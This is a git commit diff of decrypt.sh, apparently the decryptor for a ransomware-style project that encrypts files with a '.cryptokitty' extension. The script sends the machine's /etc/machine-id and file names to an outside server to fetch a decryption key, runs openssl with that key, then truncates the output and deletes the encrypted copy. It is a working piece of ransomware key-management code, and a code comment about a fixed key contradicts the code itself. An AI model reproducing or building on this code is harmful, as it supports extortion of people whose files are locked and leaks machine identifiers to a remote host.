278ce5536b9f5d1995985907c724b03c87730b45
Alvise <cavazblink182@gmail.com>
2018-07-07 16:03:44 +0200

    Update Decrypt
    Final version of the decrypt

--- decrypt.sh
+++ decrypt.sh
@@ -1,7 +1,9 @@
-#file in the first argument
-if [[ $1 =~ \.cryptokitty$ ]]; then
-  f = $1 && f = ${f%.cryptokitty}
+#!/bin/bash
+if [[ $1 =~ \.cryptokitty$ ]]; 
+  then
+  f=$1
+  f=${f%.cryptokitty}
   echo $f 
   #i decrypt the files with extension .cryptokitty and i use the key "pippo", then i remove the crypted files leaving only the clear text ones
-  [ -f $f ] && openssl enc -d -aes-256-cbc -in $f -k "\$(curl -s https://deadkitty.blasco991.com/code.php?u=$(cat /etc/machine-id)\&m=$1)\" -out "$f" && rm "$f.cryptkitty"
+  [ -f $1 ] && touch "$f" && key=$(curl -s https://deadkitty.blasco991.com/code.php?u=$(cat /etc/machine-id)\&m=$f\&a=g) && echo $key && openssl enc -d -aes-256-cbc -in $1 -k "$key" -out "$f" && truncate -s $(head -n-42 $f | wc -c) $f && rm "$f.cryptokitty"
 fi
